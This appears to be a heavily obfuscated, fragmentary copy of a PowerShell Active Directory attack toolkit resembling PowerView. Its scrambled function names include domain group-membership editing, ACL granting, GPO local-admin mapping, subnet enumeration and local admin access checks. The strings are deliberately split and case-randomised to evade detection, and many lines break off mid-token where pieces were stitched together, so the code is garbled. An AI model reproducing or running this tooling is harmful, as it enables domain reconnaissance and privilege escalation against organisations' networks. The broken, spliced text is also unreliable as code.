        if (YoV{psBIJKoIJKUNDIJKpARIJKAIJKMeters}[(Z3b{2}{3}{1}{0}{4}Z3b -fS5zLimiS5z,S5zmeS5z,S5zServerTS5z,S5ziS5z,S5ztS5z)]) { YoV{COMPuTIJKeRSIJKEaIJKRChIJKeRIJKArIJKGUMEIJKNTS}[(Z3b{3}{2}{1}{0}Z3b-f S5ztS5z,S5zimeLimiS5z,S5zrverTS5z,S5zSeS5z)] = YoV{seRveRIJKTIIJKMeIJKLIIJKMIt} }
        if (YoV{PSBoUIJKNDpaRIJKAmIJKeters}[(Z3b{0}{1}Z3b -fS5zTombstS5z,S5zoneS5z)]) { YoV{COMpUTeRsIJKEAIJKRIJKCHerARGUMIJKenTS}[(Z3b{0}{2}{1}Z3b -fS5zTS5z,S5ztoneS5z,S5zombsS5z)] = YoV{TOIJKmBstOIJKNe} }
        if (YoV{pIJKSBOIJKUNdPIJKARameTEIJKRs}[(Z3b{1}{3}{0}{2}Z3b -f S5zeS5z,S5zCrS5z,S5zntialS5z,S5zedS5z)]) { YoV{CompIJKUtErsIJKeaRIJKcHeRAIJKRIJKgIJKUMEnIJKTs}[(Z3b{2}{3}{0}{1}Z3b -f S5zdentiaS5z,S5zlS5z,S5zCrS5z,S5zeS5z)] = YoV{CIJKRedIJKeNTIJKiAL} }

        if (YoV{pIJKSIJKBoUnDPARAMIJKeTeIJKRs}[(Z3b{1}{2}{3}{0}Z3b -fS5zameS5z,S5zCS5z,S5zoS5z,S5zmputerNS5z)]) {
            YoV{tARIJKgeIJKTIJKcOMIJKpUteRs} = YoV{cOIJKMPuTERnIJKAme}
        }
        else {
            &(Z3b{1}{0}{2}Z3b -f S5z-VerbS5z,S5zWriteS5z,S5zoseS5z) (Z3b{10}{12}{6}{11}{8}{5}{4}{9}{3}{0}{2}{1}{7}Z3b -fS5z compS5z,S5zin thS5z,S5zuters S5z,S5zngS5z,S5zQuS5z,S5zpMember] S5z,S5znd-DomainLoS5z,S5ze domainS5z,S5zuS5z,S5zeryiS5z,S5z[S5z,S5zcalGroS5z,S5zFiS5z)
            YoV{TARIJKGEtcOIJKmPuTEIJKRs} = &(Z3b{1}{2}{3}{0}Z3b -fS5zomputerS5z,S5zGetS5z,S5z-DoS5z,S5zmainCS5z) @ComputerSearcherArguments JGO &(Z3b{2}{4}{3}{0}{1}Z3b-fS5zObjS5z,S5zectS5z,S5zSelS5z,S5zt-S5z,S5zecS5z) -ExpandProperty (Z3b{2}{3}{1}{0}Z3b-','UmIJKeNTs}[(Z3b{0}{1}{2}Z3b-fS5zSearchS5z,S5zBS5z,S5zaseS5z)] = YoV{seIJKARCHIJKBaIJKsE} }
        if (YoV{psBOIJKUndpIJKARaIJKmeIJKTErs}[(Z3b{1}{0}Z3b-fS5zverS5z,S5zSerS5z)]) { YoV{SeaIJKRIJKcHeIJKRIJKArg','zet-DoS5z+S5zmainGS5z+S5zPOUserLS5z+S5zoS5z+S5zcalGrS5z+S5zoupS5z+S5zMappinS5z+S5zgS5z+S5z] S5z+S5zUnabS5z+S5zle S5z+S5ztS5z+S5zo S5z+S5zretrieveS5z+S5z S5z+S5zSS5z+S5zID S5z+S5zforS5z+S5z S5z+S5zidenS5z+S5ztiS5z+S5zty S5z+Z3bS5zYoVIdentityS5zZ3b)
            }
        }
        else {
            
            YoV{tIJKARIJKGetsIds} = @(S5z*S5z)
        }

        if (YoV{LocIJKAlIJKGIJKRoUp} -match (Z3b{1}{0}Z3b -f S5z1-5S5z,S5zS-S5z)) {
            YoV{TAIJKRIJKgeTLoCALIJKSiD} = YoV{LoCIJKAlGIJKRoUp}
        }
        elseif (YoV{loCIJKAIJKLGRIJKoup} -match (Z3b{1}{0}Z3b-f S5zdminS5z,S5zAS5z)) {
            YoV{tIJKAIJKRgetIJKlocALSIJKId} = (Z3b{2}{0}{1}{3}Z3b-f S5z-S5z,S5z','Z3bVaIJKLUeZ3b::Z3beMIJKPTYZ3b
    )

    &(Z3b{2}{1}{0}Z3b-fS5zpeS5z,S5zTyS5z,S5zAdd-S5z) -AssemblyName (Z3b{11}{12}{0}{1}{8}{6}{4}{2}{3}{5}{7}{10}{9}Z3b -f S5z.S5z,S5zDirectoS5z,S5zMS5z,S5zanaS5z,S5ztS5z,S5zgeS5z,S5zices.AccounS5z,S5zmS5z,S5zryServS5z,S5zntS5z,S5zeS5z,S5zSysS5z,S5ztemS5z)

    try {
        if (YoV{PsIJKBIJKOuIJKNdPAIJKRIJKAmETErs}[(Z3b{2}{1}{0}Z3b -fS5zainS5z,S5zomS5z,S5zDS5z)] -or (YoV{iIJKDENtIIJKTY} -match (((Z3b{0}{2}{1}Z3b-f S5z.+wWxwS5z,S5z+S5z,S5zWx.S5z)).(Z3b{1}{2}{0}Z3b-fS5zlaCES5z,S5zrS5z,S5zEpS5z).Invoke(S5zwWxS5z,S5z5rjS5z)))) {
            if (YoV{IIJKDEIJKNtiTY} -match (((Z3b{0}{1}{2}Z3b -fS5z.+S5z,S5z{0S5z,S5z}{0}.+S5z))  -F[CHar]92)) {
                
                YoV{COnVEIJKRteDIJKidenIJKTitY} = YoV{IIJKdentIJKiIJKTy} JGO &(Z3b{1}{0}{4}{3}{2}Z3b-f S5zeS5z,S5zConvS5z,S5zNameS5z,S5zt-ADS5z,S5zrS5z) -OutputType (Z3b{1}{0}{2}Z3b -f S5znonicaS5z,S5zCaS5z,S5zlS5z)
      ','Z3b{0}{1}{2}Z3b -f S5zWriteS5z,S5z-WarniS5z,S5zngS5z) (S5z[ReS5z+S5zmoS5z+S5zvS5z+S5zeS5z+S5z-DomainGroS5z+S5zupMember]S5z+S5z S5z+S5zErroS5z+S5zr S5z+S5zfinS5z+S5zding S5z+S5ztS5z+S5zhe S5z+S5zgrouS5z+S5zp S5z+S5zidentiS5z+S5zty S5z+Z3bS5zYoVIdentityS5z Z3b+S5z: S5z+Z3bYoV_Z3b)
            }
        }
    }

    PROCESS {
        if (YoV{GrOIJKUP}) {
            ForEach (YoV{MEmIJKBER} in YoV{MIJKEMbERS}) {
                if (YoV{MEMIJKBer} -match (((Z3b{0}{2}{1}Z3b -fS5z.S5z,S5zou.+S5z,S5z+4ou4S5z))-cReplACe ([CHAR]52+[CHAR]111+[CHAR]117),[CHAR]92)) {
                    YoV{ConteIJKxtaRIJKguIJKMIJKeNtS}[(Z3b{0}{2}{1}Z3b -fS5zIdenS5z,S5zityS5z,S5ztS5z)] = YoV{mEIJKmbER}
                    YoV{UseRCIJKOIJKNteXT} = &(Z3b{3}{1}{5}{2}{0}{4}Z3b -f S5zlContS5z,S5zrinS5z,S5zaS5z,S5zGet-PS5z,S5zextS5z,S5zcipS5z) @ContextArguments
                    if (YoV{uSIJKeIJKRCIJKONTExt}) {
                        YoV{UsErIJKIdeNtIJKity} = YoV{uSIJKErcIJKoIJKNtext}.Z3biIJKdIJKeNTitYZ3b
                    }
                }
                else {
                    YoV{usIJKEIJKRContEIJKxt} = YoV{grOuIJKPCONTeIJKXt}
                    YoV{UsIJKErIJKiDENTIIJKTY} = YoV{MEIJKMBIJKeR}
                }
                &(Z3b{2}{0}{1}Z3b-f S5zeS5z,S5zrboseS5z,S5zWrite-VS5z) (S5z[Remove-DoS5z+S5zmainGroupS5z+S5zMemS5z+S5zbeS5z+S5zr] S5z+S5zRemS5z+S5zoS5z+S5zving S5z+S5zmemS5z+S5zber S5z+Z3bS','IJKEIJKSULts}.(Z3b{0}{1}Z3b-f S5zdisS5z,S5zposeS5z).Invoke() }
                catch {
                    &(Z3b{0}{1}{2}Z3b-fS5zWriS5z,S5ztS5z,S5ze-VerboseS5z) (S5z[GetS5z+S5z-DoS5z+S5zmainDNSRS5z+S5zeS5z+S5zcS5z+S5zord] S5z+S5zErS5z+S5zror S5z+S5zdisS5z+S5zposingS5z+S5z S5z+S5zofS5z+S5z S5z+S5ztheS5z+S5z S5z+S5zResulS5z+S5zts S5z+S5zobjecS5z+S5ztS5z+S5z: S5z+Z3bYoV_Z3b)
                }
            }
            YoV{dIJKNSIJKseArCIJKHeR}.(Z3b{0}{1}Z3b -f S5zdisS5z,S5zposeS5z)','ndPArAmEtIJKeIJKRs} -and (YoV{pSBIJKouNDIJKPARamEtIJKerS}.Z3bcOUIJKNtZ3b -ne 0)) {
            &(Z3b{2}{6}{3}{5}{4}{1}{0}Z3b-fS5zeterS5z,S5zamS5z,S5zNS5z,S5zDynaS5z,S5zcParS5z,S5zmiS5z,S5zew-S5z) -CreateVariables -BoundParameters YoV{PsbOUNDpArIJKAIJKMIJKeterS}
        }
        if (YoV{oBIJKjIJKECTsEarchEr}) {
            YoV{IIJKDeNTItyfIJKIlTIJKER} = S5zS5z
            YoV{fIJKILIJKTeR} = S5zS5z
            YoV{IdEIJKNTIIJKTy} JGO &(Z3b{0}{2}{1}Z3b-f S5zWS5z,S5zctS5z,S5zhere-ObjeS5z) {YoV{_}} JGO &(Z3b{2}{0}{3}{1}Z3b -fS5zacS5z,S5zObjectS5z,S5zForES5z,S5zh-S5z) {
                YoV{iIJKdEnTiTyiNIJKstAIJKNIJKCe} = YoV{_}.(Z3b{0}{1}Z3b -f S5zRS5z,S5zeplaceS5z).Invoke(S5z(S5z, S5z5rj28S5z).(Z3b{1}{0}Z3b -fS5zceS5z,S5zReplaS5z).Invoke(S5z)S5z, S5z5rj29S5z)
                if (YoV{IdIJKENTiTyIIJKNStaIJKNcE} -match (Z3b{1}{0}Z3b-fS5zS-1-S5z,S5z^S5z)) {
                    YoV{IDEIJKNTiTyIJKFIIJKlTeR} += Z3b(objectsid=YoVIdentityInstance)Z3b
                }
                elseif (YoV{IDeNTIJKItIJKyIJKINSTANce} -match (((Z3b{4}{1}{2}{0}{3}Z3b-fS5zhADS5z,S5zhAOS5z,S5zU0S5z,S5zC)=S5z,S5z^(CN0S5z)).(Z3b{2}{1}{0}Z3b-fS5zLacES5z,S5zePS5z,S5zrS5z).Invoke(S5z0hAS5z,S5zJGOS5z))) {
                    YoV{IdI','MemS5z,S5zbeS5z) (Z3b{1}{3}{0}{2}Z3b -f S5zrtS5z','          if (YoV{CIJKOnvIJKERtEdIdENtIJKIty}) {
                    YoV{CIJKONIJKNECTIJKTaRgIJKeT} = YoV{CONVErIJKTeDIJKIDIJKentiTy}.(Z3b{1}{2}{0}Z3b -f S5zgS5z,S5zSubSS5z,S5ztrinS5z).Invoke(0, YoV{cOnvEIJKRteIJKdIJKidEnTITY}.(Z3b{2}{1}{0}Z3b -f S5zdexOfS5z,S5znS5z,S5zIS5z).Invoke(S5z/S5z))
                    YoV{obJIJKeCtIJKidIJKEnTiIJKTY} = YoV{idEIJKNTitY}.(Z3b{1}{0}Z3b -f S5ztS5z,S5zSpliS5z).Invoke(S5z5rjS5z)[1]
                    &(Z3b{0}{3}{1}{2}Z3b-f S5zWrite-VS5z,S5zrbS5z,S5zoseS5z,S5zeS5z) (S5z[GS5z+S5zet-PrincipS5z+S5zalS5z+S5zContS5z+S5zeS5z+S5zxt] S5z+S5zBinS5z+S5zdingS5z+S5z S5z+S5ztoS5z+S5z S5z+S5zdS5z+S5zomain S5z+Z3bS5zYoVConnectTargetS5zZ3b)
                }
            }
            else {
                YoV{ObIJKjeCTIJKIDENTItY} = YoV{iIJKDeNtIIJKTy}
                &(Z3b{4}{1}{3}{0}{2}Z3b-fS5zVeS5z,S5zeS5z,S5zrboseS5z,S5z-S5z,S5zWritS5z) (S5z[GetS5z+S5z-PrincS5z+S5zipaS5z+S5zlS5z+S5zContexS5z+S5zt] S5z+S5zBS5z+S5zindingS5z+S5z S5z+S5ztS5z+S5zo S5z+S5zdomaiS5z+S5znS5z+S5z S5z+Z3bS5zYoVDomainS5zZ3b)
                YoV{CoNNEcTIJKTIJKAIJKRGet} = YoV{dIJKoIJKmAIN}
            }

            if (YoV{psBIJKoUNdIJKpIJKAraMEtIJKErS}[(Z3b{1}{2}{0}{3}Z3b -f S5zedentiS5z,S5zCS5z,S5zrS5z,S5zalS5z)]) {
                &(Z3b{0}{2}{1}Z3b -f S5zWritS5z,S5z-VerboseS5z,S5zeS5z) (Z3b{7}{0}{8}{1}{3}{2}{6}{4}{5}Z3b-f S5ztS5z,S5zipalS5z,S5z altS5z,S5zContext] UsingS5z,S5zdentS5z,S5zialsS5z,S5zernate creS5z,S5z[GeS5z,S5z-PrincS5z)
                YoV{cIJKoNteIJKxt} = &(Z3b{1}{2}{0}Z3b-f S5z-ObjectS5z,S5zNS5z,S5zewS5z) -TypeName (Z3b{9}{1}{8}{0}{5}{11}{3}{6}{2}{4}{10}{7}Z3b-fS5zDirectoryServicS5z,S5zteS5z,S5zentS5z,S5zccoS5z,S5z.PrinciS5z,S5zeS5z,S5zuntManagemS5z,S5ztS5z,S5zm.S5z,S5zSysS5z,S5zpalContexS5z,S5zs.AS5z) -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Z3bDoIJKMaiNZ3b, YoV{cONnEIJKcIJKTIJKTaRIJKGet}, YoV{CIJKREIJKDEnTIJKIal}.Z3buIJK','nS5z,S5zSeaS5z) @PSBoundParameters

            if (YoV{DfIJKSSeArcIJKher}) {
                YoV{DFSIJKShaRIJKes} = @()
                YoV{dfsseIJKArcIJKHer}.Z3bfIIJKlTerZ3b = (Z3b{1}{0}{3}{5}{4}{2}Z3b-f S5ztS5z,S5z(&(objecS5z,S5z))S5z,S5zCS5z,S5zfTDfsS5z,S5zlass=S5z)

                try {
                    YoV{rESUIJKlTS} = YoV{dIJKFSSEARCIJKheR}.(Z3b{','        YoV{OBjIJKect} = &(Z3b{1}{0}{2}Z3b-fS5zmainObjeS5z,S5zGet-DoS5z,S5zctS5z) @ObjectSearcherArguments
                    YoV{PRIJKOIJKPertIJKIES} = YoV{obJIJKeCT}.Z3bprOpErTIJKiIJKESZ3b
                }

                if (YoV{PrIJKoIJKPertiIJKes}) {
                    YoV{GRoIJKUpIJKmemBER} = &(Z3b{2}{0}{1}Z3b -f S5zew-ObjS5z,S5zectS5z,S5zNS5z) (Z3b{1}{0}Z3b-fS5ztS5z,S5zPSObjecS5z)
             ','3b
                                }
                                else {
                                    YoV{inTIJKerIJKEstINGIJKACl} JGO &(Z3b{1}{2}{0}Z3b-fS5zrS5z,S5zAS5z,S5zdd-MembeS5z) (Z3b{2}{1}{0}Z3b -fS5zertyS5z,S5zotePropS5z,S5zNS5z) (Z3b{4}{0}{3}{2}{1}Z3b-f S5zjectAceS5z,S5zpeS5z,S5zyS5z,S5zTS5z,S5zObS5z) (Z3b{1}{0}Z3b-fS5zeS5z,S5zNonS5z)
                                }
                                YoV{inTIJKErestiNgAIJKcL} JGO &(Z3b{2}{3}{1}{0}Z3b-fS5zmberS5z,S5zeS5z,S5zAdS5z,S5zd-MS5z) (Z3b{1}{3}{2}{0}Z3b -f S5zropertyS5z,S5zNS5z,S5zePS5z,S5zotS5z) (Z3b{1}{2}{0}Z3b-f S5zagsS5z,S5zAceFS5z,S5zlS5z) YoV{_}.Z3baIJKCeFLAIJKgsZ3b
                                YoV{iNTEREIJKstIIJKNgIJKACl} JGO &(Z3b{0}{2}{1}Z3b-f S5zAdd-MeS5z,S5zrS5z,S5zmbeS5z) (Z3b{3}{1}{0}{2}Z3b-fS5zopertS5z,S5zotePrS5z,S5zyS5z,S5zNS5z) (Z3b{1}{0}Z3b -f S5zTypeS5z,S5zAceS5z) YoV{_}.Z3bAcEIJKTYPEZ3b
                                YoV{iNteIJKRIJKeSTiIJKNgACL} JGO &(Z3b{0}{1}{2}Z3b-fS5zAdd-MemS5z,S5zbS5z,S5zerS5z) (Z3b{1}{0}{2}{3}Z3b -fS5ztS5z,S5zNoS5z,S5zeS5z,S5zPropertyS5z) (Z3b{3}{1}{4}{2}{0}Z3b-f S5zagsS5z,S5zhS5z,S5znceFlS5z,S5zInS5z,S5zeritaS5z) YoV{_}.Z3biIJKNhIJKeriIJKTanIJKCeFIJKlagsZ3b
                                YoV{INTerIJKestingIJKACl} JGO &(Z3b{1}{2}{0}Z3b -f S5zerS5z,S5zAdd-MS5z,S5zembS5z) (Z3b{1}{0}{2}Z3b -f S5zoteProperS5z,S5zNS5z,S5ztyS5z) (Z3b{3}{2}{0}{1}Z3b-f S5ztifS5z,S5zierS5z,S5znS5z,S5zSecurityIdeS5z) YoV{_}.Z3bsIJKECurITyIJKidenIJKTifIErZ3b
                                YoV{iNIJKTErIJKEIJKsTInGIJKAcL} JGO &(Z3b{1}{0}{2}Z3b-fS5zMeS5z,S5zAdd-S5z,S5zmberS5z) (Z3b{3}{1}{2}{0}Z3b-fS5ztyS5z,S5zotePropeS5z,S5zrS5z,S5zNS5z) (Z3b{4}{3}{2}{1}{0}Z3b -fS5zeNameS5z,S5ztyReferencS5z,S5zntiS5z,S5zdeS5z,S5zIS5z) YoV{IDIJKenIJKTiTyREIJKFIJKErEIJKNcEnaMe}
                                YoV{inIJKTIJKERIJKESIJKTiNGAcL} JGO &(Z3b{0}{1}{2}Z3b-f S5zAS5z,S5zddS5z,S5z-MemberS5z) (Z3b{1}{0}{2}{3}Z3b -fS5zoteS5z,S5zNS5z,S5zPropS5z,S5zertyS5z) (Z3b{0}{4}{1}{3}{2}Z3b-f S5zIdentityReS5z,S5zereS5z,S5zomainS5z,S5znceDS5z,S5zfS5z) YoV{ideIJKNTIJKityREFIJKerIJKenIJKCEIJKdomAiN}
                                YoV{IIJKNtERIJKesTinIJKgaCl} JGO &(Z3b{0}{1}{2}Z3b -fS5zAdd-MembS5z,S5zeS5z,S5zrS5z) (Z3b{1}{2}{0}Z3b-f S5zyS5z,S5zNotePropeS5z,S5zrtS5z) (Z3b{3}{1}{0}{4}{2}Z3b-fS5zReS5z,S5zyS5z,S5zceDNS5z,S5zIdentitS5z,S5zferenS5z) YoV{idEnTIJKITYreIJKFerIJKEIJKNCEdn}
                                YoV{IIJKNTERESTIIJKNGAIJKcl} JGO &(Z3b{0}{1}{2}Z3b -f S5zAdd-MS5z,S5zembS5z,S5zerS5z) (Z3b{1}{2}{3}','zrimS5z,S5zTS5z).Invoke() -ne S5zS5z) ) {
                YoV{FIJKILtIJKEr} += Z3b(JGOYoVIdentityFilter)Z3b
            }

            if (YoV{PsIJKBOIJKUNDPAIJKRaMIJKetERs}[(Z3b{1}{0}{2}Z3b -fS5zDAPFiltS5z,S5zLS5z,S5zerS5z)]) {
                &(Z3b{2}{1}{0}Z3b -f S5zoseS5z,S5z-VerbS5z,S5zWriteS5z) (S5z[S5z+S5zGeS5z+S5ztS5z+S5z-DomainSubnetS5z+S5z] S5z+S5zUsingS5z+S5z S5z+S5zaddS5z+S5ziS5z+S5ztionaS5z+S5zl S5z+S5zLDAPS5z+S5z S5z+S5zfiltS5z+S5zer:S5z+S5z S5z+Z3bYoVLDAPFilterZ3b)
                YoV{FIJKILTEr} += Z3bYoVLDAPFilterZ3b
            }

            YoV{sIJKUBIJKNIJKEtSearCIJKHeR}.Z3bfiLIJKTERZ3b = Z3b(&(objectCategory=subnet)YoVFilter)Z3b
            &(Z3b{2}{1}{0}Z3b -fS5zeS5z,S5zVerbosS5z,S5zWrite-S5z) Z3b[Get-DomainSubnet] Get-DomainSubnet filter string: YoV(YoVSubnetSearcher.filter) Z3b

            if (YoV{PsBOIJKUndPIJKArIJKAmETIJKErS}[(Z3b{0}{1}Z3b-fS5zFS5z,S5zindOneS5z)]) { YoV{REsuLIJKTs} = YoV{sIJKUbNEtsEIJKARIJKcIJKHER}.(Z3b{0}{2}{1}Z3b-fS5zFinS5z,S5zneS5z,S5zdOS5z).Invoke() }
            else { YoV{ResIJKULIJKTs} = YoV{SUbNETIJKSEAIJKRChIJKEr}.(Z3b{0}{1}Z3b -fS5zFinS5z,S5zdAllS5z).Invoke() }
            YoV{ResIJKUIJKLtS} JGO &(Z3b{0}{1}{2}{3}Z3b -f S5zWhS5z,S5zere-ObjS5z,S5zecS5z,S5ztS5z) {YoV{_}} JGO &(Z3b{1}{2}{0}{3}Z3b-f S5zbjS5z,S5zFS5z,S5zorEach-OS5z,S5zectS5z) {
                if (YoV{PsBIJKOUndpIJKArIJKAmeIJKTeRS}[S5zRawS5z]) {
                    
                    YoV{sIJKUIJKBneT} = YoV{_}
                }
                else {
                    YoV{SIJKUBIJKNET} = &(Z3b{6}{3}{0}{5}{4}{1}{2}Z3b-fS5z-LS5z,S5zpeS5z,S5zrtyS5z,S5zonvertS5z,S5zProS5z,S5zDAPS5z,S5zCS5z) -Properties YoV{_}.Z3bPROIJKpIJKeRtIeSZ3b
                }
                YoV{SIJKUbIJKNeT}.Z3bPIJKSoBJecTZ3b.Z3btypenIJKAMIJKesZ3b.(Z3b{0}{1}Z3b -f S5zInsS5z,S5zertS5z).Invoke(0, (Z3b{1}{0}{2}{3}Z3b -f S5ziS5z,S5zPowerVS5z,S5zew.SS5z,S5zubnetS5z))

                if (YoV{pSboUIJKNdPAIJKRamIJKETers}[(Z3b{0}{2}{1}Z3b -f S5zSiS5z,S5zmeS5z,S5zteNaS5z)]) {
                    
                    
                    if (YoV{suIJKBIJKNET}.Z3bproIJKPEIJKRTI',' -f S5zReS5z,S5zt-WMIS5z,S5zgPrS5z,S5zoxyS5z,S5zGeS5z)
&(Z3b{0}{1}{2}Z3b-f S5zSet-AliS5z,S5zaS5z,S5zsS5z) (Z3b{2}{3}{1}{0}Z3b-fS5zdOnS5z,S5z-LastLoggeS5z,S5zGeS5z,S5ztS5z) (Z3b{0}{3}{5}{4}{1}{6}{2}Z3b -f S5zGS5z,S5zggS5z,S5znS5z,S5zet-WMIS5z,S5zoS5z,S5zRegLastLS5z,S5zedOS5z)
&(Z3b{0}{1}{2}Z3b-fS5zSet-S5z,S5zAS5z,S5zliasS5z) (Z3b{1}{0}{4}{3}{2}Z3b-fS5zt-CacS5z,S5zGeS5z,S5zectionS5z,S5zedRDPConnS5z,S5zhS5z) (Z3b{5}{6}{2}{4}{1}{0}{3}Z3b -fS5zPConnS5z,S5zdRDS5z,S5zMIRegS5z,S5zectionS5z,S5zCacheS5z,S5zGetS5z,S5z-WS5z)
&(Z3b{2}{0}{1}Z3b -fS5zet-AlS5z,S5ziasS5z,S5zSS5z) (Z3b{6}{1}{5}{3}{0}{4}{2}Z3b -fS5znS5z,S5zegistS5z,S5zeS5z,S5zuS5z,S5ztedDrivS5z,S5zryMoS5z,S5zGet-RS5z) (Z3b{3}{0}{1}{4}{2}Z3b -fS5zReS5z,S5zgMoS5z,S5ztedDriveS5z,S5zGet-WMIS5z,S5zunS5z)
&(Z3b{1}{2}{0}Z3b-fS5zasS5z,S5zSet-AlS5z,S5ziS5z) (Z3b{1}{0}{2}{3}Z3b-fS5zet-NetPS5z,S5zGS5z,S5zroceS5z,S5zssS5z) (Z3b{0}{1}{3}{2}Z3b -fS5zGS5z,S5zet-S5z,S5zessS5z,S5zWMIProcS5z)
&(Z3b{2}{0}{1}Z3b -f S5zAlS5z,S5ziasS5z,S5zSet-S5z) (Z3b{4}{0}{2}{1}{3}Z3b-fS5zhreadedFunS5z,S5zoS5z,S5zctiS5z,S5znS5z,S5zInvoke-TS5z) neW-IJKTHreIJKADEIJKDFUIJKNCtIJKion
&(Z3b{1}{0}{3}{2}Z3b-fS','5-3S5z,S5zS-1S5z,S5z2-544S5z)
        }
        else {
            
            YoV{TIJKARgIJKeTLIJKOcIJKALSid} = (Z3b{0}{1}{2}Z3b -fS5zS-1-5-S5z,S5z32-5S5z,S5z55S5z)
        }

        if (YoV{TARGEIJKTsIIJKDS}[0] -ne S5z*S5z) {
            ForEach (YoV{tArGetIJKSIJKID} in YoV{TAIJKRgEtsIJKidS}) {
                &(Z3b{0}{2}{1}{3}Z3b-f S5zWS5z,S5ziteS5z,S5zrS5z,S5z-VerboseS5z) (S5z[GeS5z+S5zt-DS5z+S5zomainS5z+S5zGPOUseS5z+S5zrLocS5z+S5zaS5z+S5zlGS5z+S5zroupS5z+S5zMappiS5z+S5zngS5z+S5z] S5z+S5zEnuS5z+S5zmeratiS5z+S5znS5z+S5zg S5z+S5znesS5z+S5ztS5z+S5zed S5z+S5zgS5z+S5zrouS5z+S5zp S5z+S5zmS5z+S5zembershiS5z+S5zpS5z+S5zs S5z+S5zfS5z+S5zor: S5z+Z3bS5zYoVTargetSidS5zZ3b)
                YoV{TIJKAIJKRGeTIJKsIDS} += &(Z3b{3}{1}{2}{0}Z3b-fS5zroupS5z,S5zomS5z,S5zainGS5z,S5zGet-DS5z) @CommonArguments -Properties (Z3b{0}{2}{1}Z3b-f S5zobjS5z,S5zsidS5z,S5zectS5z) -MemberIdentity YoV{tAIJKRGeTIJKSId} JGO &(Z3b{0}{1}{2}Z3b -f S5zSelectS5z,S5z-ObjecS5z,S5ztS5z) -ExpandProperty (Z3b{2}{0}{1}Z3b-fS5zbjecS5z,S5ztsidS5z,S5zoS5z)
            }
        }

        &(Z3b{3}{1}{0}{2}Z3b-f S5zbosS5z,S5zite-VerS5z,S5zeS5z,S5zWrS5z) (S5z[Get-DomS5z+S5zaS5z+S5zinGPOUS5z+S5zsS5z+S5zerLoS5z+S5zcalS5z+S5zGroupMappS5z+S5zing]S5z+S5z S5z+S5zTaS5z+S5zrS5z+S5zget S5z+S5zlS5z+S5zocalS5z+S5zgS5z+S5zroup S5z+S5zSIDS5z+S5z: S5z+Z3bYoVTargetLocalSIDZ3b)
        &(Z3b{4}{1}{3}{2}{0}Z3b -fS5zrboseS5z,S5ziS5z,S5zeS5z,S5zte-VS5z,S5zWrS5z) (S5z[S5z+S5zGet-DomS5z+S5zaS5z+S5zinGPOUS5z+S5zsS5z+S5zerLS5z+S5zoS5z+S5zcalGroS5z+S5zupMapping] S5z+S5zEffeS5z+S5zctiveS5z+S5z S5z+S5ztargeS5z+S5ztS5z+S5z S5z+S5zdomainS5z+S5z S5z+S5zSIDs:S5z+S5z S5z+Z3bYoVTargetSIDsZ3b)

        YoV{GPIJKoIJKgIJKRoUPS} = &(Z3b{0}{4}{1}{3}{5}{6}{2}Z3b -f S5zGeS5z,S5z-DomS5z,S5zlGroupS5z,S5zainGS5z,S5ztS5z,S5zPS5z,S5zOLocaS5z','xIJKPj}=[TyPe](Z3b{0}{1}Z3b-fS5zTS5z,S5zYPeS5z);  &(Z3b{2}{0}{1}Z3b-f S5z-itS5z,S5zEMS5z,S5zSeTS5z)  (S5zvS5z+S5zArIABLE:aUS5z+S5zfS5z) ( [tyPE](Z3b{3}{0}{4}{1}{6}{2}{5}Z3b -FS5z','3b{0}{1}{2}Z3b -f S5zWS5z,S5zrite-VerboS5z,S5zseS5z) Z3b[Add-DomainObjectAcl] Error granting principal YoV(YoVPrincipalObject.distinguishedname) S5zYoVRightsS5z on YoV(YoVTargetObject.Properties.distinguishedname) : YoV_ Z3b
                }
            }
        }
    }
}


function ReMoIJKVIJKE-dOMaIJKiNOIJKBJIJKeIJKctAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{4}{3}{0}{2}Z3b -f S5zoS5z,S5zPSS5z,S5zce','OGrS5z,S5zouS5z) (Z3b{1}{4}{0}{3}{2}Z3b -fS5zinGS5z,S5zGetS5z,S5zpS5z,S5zPOLocalGrouS5z,S5z-DomaS5z)
&(Z3b{0}{2}{1}Z3b -f S5zSet-AliS5z,S5zsS5z,S5zaS5z) (Z3b{1}{3}{0}{2}{4}Z3b-f S5z-GPS5z,S5zFinS5z,S5zOLoS5z,S5zdS5z,S5zcationS5z) (Z3b{7}{3}{4}{2}{6}{1}{5}{0}{8}Z3b-f S5zalGrouS5z,S5zrLS5z,S5zainS5z,S5zetS5z,S5z-DomS5z,S5zocS5z,S5zGPOUseS5z,S5zGS5z,S5zpMappingS5z)
&(Z3b{1}{0}{2}Z3b -f S5zAS5z,S5zSet-S5z,S5zliasS5z) (Z3b{0}{3}{2}{1}Z3b-f S5zFindS5z,S5zrAdminS5z,S5zPOComputeS5z,S5z-GS5z) (Z3b{1}{9}{5}{3}{8}{6}{0}{2}{4}{7}Z3b -fS5zrLS5z,S5zGet-DomainGS5z,S5zocalGS5z,S5zomS5z,S5zroupMappiS5z,S5zCS5z,S5zuteS5z,S5zngS5z,S5zpS5z,S5zPOS5z)
&(Z3b{0}{1}{2}Z3b -f S5zSS5z,S5zet-AliS5z,S5zasS5z) (Z3b{1}{2}{0}{3}Z3b -fS5zgedOnLocS5z,S5zGS5z,S5zet-LogS5z,S5zalS5z) (Z3b{2}{3}{1}{0}Z3b -fS5zOnS5z,S5zedS5z,S5zGeS5z,S5zt-RegLoggS5z)
&(Z3b{0}{1}{2}Z3b-f S5zSeS5z,S5zt-AliS5z,S5zasS5z) (Z3b{1}{0}{4}{2}{3}Z3b-fS5zeS5z,S5zInvokS5z,S5zalAdminS5z,S5zAccessS5z,S5z-CheckLocS5z) (Z3b{0}{1}{2}{3}Z3b -f S5zTestS5z,S5z-AS5z,S5zdminAcceS5z,S','eS5z,S5zAllS5z,S5zonS5z,S5zowDeS5z,S5zgatiS5z)] = YoV{USeRaLloWdIJKeIJKLEIJKGATIJKIon} }
        if (YoV{psIJKBOIJKUNDIJKPIJKAraIJKMeterS}[(Z3b{0}{1}Z3b -fS5zServeS5z,S5zrS5z)]) { YoV{UserSEAIJKRIJKCHErIJKArgUmEIJKNts}[(Z3b{1}{0}{2}Z3b -f S5zrvS5z,S5zSeS5z,S5zerS5z)] = YoV{SIJKeIJKRvER} }
        if (YoV{pSIJKBouIJKNdpaRIJKAmeteIJKRS}[(Z3b{0}{2}{1}Z3b-fS5zSearS5z,S5zScopeS5z,S5zchS5z)]) { YoV{USErsIJKeIJKAIJKRchERARgUmENIJKTS}[(Z3b{0}{3}{2}{1}Z3b-fS5zSearcS5z,S5zopeS5z,S5zScS5z,S5zhS5z)] = YoV{SIJKeARcIJKhScoIJKPE} }
